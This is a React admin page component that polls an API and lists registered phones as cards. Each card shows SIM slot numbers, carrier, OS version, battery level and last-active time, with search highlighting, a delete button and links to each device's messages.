import { useEffect, useState, useRef } from "react";
import AdminNavigation from "./AdminNavigation";
import { Smartphone, Trash2 } from "lucide-react";
import axios from "axios";
import { useNavigate } from "react-router-dom";
import API_URL from "../apiConfig";

// --- NEW HELPER COMPONENT ---
// This component takes text and a search term (highlight).
// It splits the text by the search term and wraps the match in a yellow <mark> tag.
const Highlight = ({ text, highlight }) => {
  const normalizedText = text || ""; // Ensure text is a string
  const normalizedHighlight = (highlight || "").trim();

  if (!normalizedHighlight) {
    return <>{normalizedText}</>; // No highlight, just return text
  }

  // Escape regex special characters in the highlight string
  const escapedHighlight = normalizedHighlight.replace(
    /[.*+?^${}()|[\]\\]/g,
    "\\$&"
  );
  const regex = new RegExp(`(${escapedHighlight})`, "gi");
  const parts = normalizedText.split(regex);

  return (
    <>
      {parts.map((part, i) =>
        // Check if this part (case-insensitively) matches the highlight
        part.toLowerCase() === normalizedHighlight.toLowerCase() ? (
          <mark key={i} className="bg-yellow-300 p-0 m-0 rounded">
            {part}
          </mark>
        ) : (
          <span key={i}>{part}</span> // Use span for React key consistency
        )
      )}
    </>
  );
};
// --- END OF HELPER COMPONENT ---

export default function Devices() {
  const [devices, setDevices] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [search, setSearch] = useState("");
  const navigate = useNavigate();

  const intervalRef = useRef();
  useEffect(() => {
    const fetchDevices = async () => {
      try {
        setError("");
        const res = await axios.get(`${API_URL}/getAllDevices`, {
          withCredentials: true,
        });
        setDevices(res.data?.devices || res.data || []);
      } catch (err) {
        setError("Failed to fetch devices");
      } finally {
        setLoading(false);
      }
    };
    fetchDevices();
    intervalRef.current = setInterval(fetchDevices, 2500);
    return () => clearInterval(intervalRef.current);
  }, []);

  return (
    <AdminNavigation>
      <div className="relative h-[calc(100vh-5rem)] md:h-[calc(100vh-2rem)] max-w-6xl mx-auto">
        <div className="flex flex-col gap-2 sm:flex-row sm:items-center sm:gap-3 mb-6">
          <div className="flex-1 flex justify-end items-center gap-2 mt-2 sm:mt-0">
            <input
              type="text"
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Search devices..."
              className="w-full sm:w-64 px-4 py-2 rounded-xl border border-white focus:ring-2 focus:ring-green-400 focus:outline-none shadow-sm text-sm bg-white"
            />
          </div>
        </div>
        <div
          className="overflow-y-auto h-full pb-4 pr-1"
          style={{ maxHeight: "calc(100vh - 10rem)" }}
        >
          <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5 gap-2">
            {loading ? (
              <div className="col-span-full text-center py-12 text-gray-400 text-lg">
                Loading devices...
              </div>
            ) : error ? (
              <div className="col-span-full text-center py-12 text-red-400 text-lg">
                {error}
              </div>
            ) : devices.length === 0 ? (
              <div className="col-span-full text-center py-12 text-gray-400 text-lg">
                No devices found.
              </div>
            ) : (
              [...devices]
                .filter((dev) => {
                  const q = search.toLowerCase();
                  if (!q) return true; // Show all if search is empty
                  return (
                    (dev.deviceId || dev._id || "").toLowerCase().includes(q) ||
                    (dev.brand || "").toLowerCase().includes(q) ||
                    (dev.model || "").toLowerCase().includes(q) ||
                    (dev.manufacturer || "").toLowerCase().includes(q) ||
                    // UPDATED: Search slot numbers directly
                    (dev.slot1Number || "").toLowerCase().includes(q) ||
                    (dev.slot2Number || "").toLowerCase().includes(q)
                  );
                })
                .sort((a, b) => {
                  if (a.isActive && !b.isActive) return -1;
                  if (!a.isActive && b.isActive) return 1;
                  return 0;
                })
                .map((dev, idx, arr) => (
                  <div
                    key={dev.deviceId || dev._id}
                    className={`rounded-2xl shadow-lg p-3 border hover:scale-[1.02] transition-transform cursor-pointer flex flex-col
                    ${
                      dev.isActive
                        ? "bg-gradient-to-br from-green-100 via-white to-green-50 border-green-200"
                        : "bg-gradient-to-br from-red-100 via-white to-red-50 border-red-200"
                    }`}
                    onClick={() => navigate(`/messages/${dev.deviceId}`)}
                    title="View messages for this device"
                  >
                    {/* CARD HEADER */}
                    <div className="flex items-center justify-between mb-2">
                      <div className="flex items-center gap-2">
                        <span
                          className={`text-xs font-semibold px-2 py-0.5 rounded ${
                            dev.isActive
                              ? "bg-green-200 text-green-700"
                              : "bg-red-200 text-red-700"
                          }`}
                        >
                          {dev.isActive ? "Active" : "Inactive"}
                        </span>
                        <span
                          className={`text-xs font-bold px-2 py-0.5 rounded ${
                            dev.isActive
                              ? "bg-green-200 text-green-700"
                              : "bg-red-200 text-red-700"
                          }`}
                        >
                          #{arr.length - idx}
                        </span>
                      </div>
                      <button
                        className="p-1 rounded-full bg-red-100 hover:bg-red-200 text-red-600 transition"
                        title="Delete Device"
                        onClick={async (e) => {
                          e.stopPropagation();
                          if (
                            !window.confirm(
                              "Are you sure you want to delete this device?"
                            )
                          )
                            return;
                          try {
                            await axios.delete(
                              `${API_URL}/deleteDevice/${dev._id}`,
                              { withCredentials: true }
                            );
                            setDevices((prev) =>
                              prev.filter(
                                (d) =>
                                  (d.deviceId || d._id) !==
                                  (dev.deviceId || dev._id)
                              )
                            );
                          } catch (err) {
                            alert("Failed to delete device.");
                          }
                        }}
                      >
                        <Trash2 size={14} />
                      </button>
                    </div>

                    {/* CARD TITLE: Device ID and Model (UPDATED) */}
                    <h3
                      className={`text-md font-bold truncate ${
                        dev.isActive ? "text-green-800" : "text-red-800"
                      }`}
                      title={dev.deviceId || dev._id}
                    >
                      {/* USE HIGHLIGHT COMPONENT */}
                      <Highlight
                        text={dev.deviceId || dev._id || `Device-${idx + 1}`}
                        highlight={search}
                      />
                    </h3>
                    {/* (UPDATED) */}
                    <p className="text-xs text-gray-500 mb-2">
                      <Highlight text={dev.brand} highlight={search} />{" "}
                      <Highlight text={dev.model} highlight={search} />
                    </p>

                    {/* CARD BODY: Device Info (UPDATED) */}
                    <div className="text-xs mb-3">
                      {/* Phone Numbers (UPDATED) */}
                      <div
                        className={`p-1.5 rounded-lg mb-2 ${
                          dev.isActive ? "bg-green-50" : "bg-red-50"
                        }`}
                      >
                        <div className="flex justify-between">
                          <span className="font-semibold">Slot 1:</span>
                          <span>
                            {dev.slot1Number ? (
                              <Highlight
                                text={dev.slot1Number}
                                highlight={search}
                              />
                            ) : (
                              <span className="text-gray-400 italic">
                                (none)
                              </span>
                            )}
                          </span>
                        </div>
                        <div className="flex justify-between">
                          <span className="font-semibold">Slot 2:</span>
                          <span>
                            {dev.slot2Number ? (
                              <Highlight
                                text={dev.slot2Number}
                                highlight={search}
                              />
                            ) : (
                              <span className="text-gray-400 italic">
                                (none)
                              </span>
                            )}
                          </span>
                        </div>
                      </div>

                      {/* Info Tags (UPDATED) */}
                      <div className="flex flex-wrap gap-1 mb-2">
                        <span
                          className={`px-2 py-0.5 rounded-full ${
                            dev.isActive
                              ? "bg-green-100 text-green-700"
                              : "bg-red-100 text-red-700"
                          }`}
                        >
                          OS: <Highlight text={dev.osVersion} highlight={search} />
                          {dev.sdkVersion ? (
                            <>
                              {" "}(SDK{" "}
                              <Highlight
                                text={dev.sdkVersion?.toString()}
                                highlight={search}
                              />
                              )
                            </>
                          ) : (
                            ""
                          )}
                        </span>
                        <span
                          className={`px-2 py-0.5 rounded-full ${
                            dev.isActive
                              ? "bg-green-100 text-green-700"
                              : "bg-red-100 text-red-700"
                          }`}
                        >
                          Carrier:{" "}
                          <Highlight
                            text={dev.carrierName}
                            highlight={search}
                          />
                        </span>
                        <span
                          className={`px-2 py-0.5 rounded-full ${
                            dev.isActive
                              ? "bg-green-100 text-green-700"
                              : "bg-red-100 text-red-700"
                          }`}
                        >
                          SIMs:{" "}
                          <Highlight
                            text={dev.simSlotCount?.toString()}
                            highlight={search}
                          />
                        </span>
                      </div>

                      {/* Manufacturer (UPDATED) */}
                      <div className="text-gray-500">
                        <span className="font-semibold text-gray-600">
                          Manuf:
                        </span>{" "}
                        <Highlight
                          text={dev.manufacturer}
                          highlight={search}
                        />
                      </div>
                    </div>

                    {/* CARD FOOTER */}
                    <div
                      className={`flex items-center justify-between mt-auto pt-2 border-t ${
                        dev.isActive
                          ? "border-green-200"
                          : "border-red-200"
                      }`}
                    >
                      <span
                        className={`px-2 py-0.5 rounded text-xs font-semibold ${
                          dev.isActive
                            ? "bg-green-100 text-green-700"
                            : "bg-red-100 text-red-700"
                        }`}
                      >
                        Batt: {dev.batteryLevel}%
                      </span>
                      <span className="text-xs text-gray-400">
                        {dev.lastActive
                          ? `Last: ${new Date(
                              dev.lastActive
                            ).toLocaleTimeString([], {
                              hour: "2-digit",
                              minute: "2-digit",
                              hour12: true,
                            })}`
                          : ""}
                      </span>
                      <span className="text-xs text-gray-400">
                        {dev.lastActive
                          ? `${new Date(dev.createdAt).toLocaleDateString(
                              undefined,
                              {
                                year: "numeric",
                                month: "short",
                                day: "numeric",
                              }
                            )} ${new Date(dev.createdAt).toLocaleTimeString(
                              [],
                              {
                                hour: "2-digit",
                                minute: "2-digit",
                                hour12: true,
                              }
                            )}`
                          : ""}
                      </span>
                    </div>
                  </div>
                ))
            )}
          </div>
        </div>
      </div>
    </AdminNavigation>
  );
}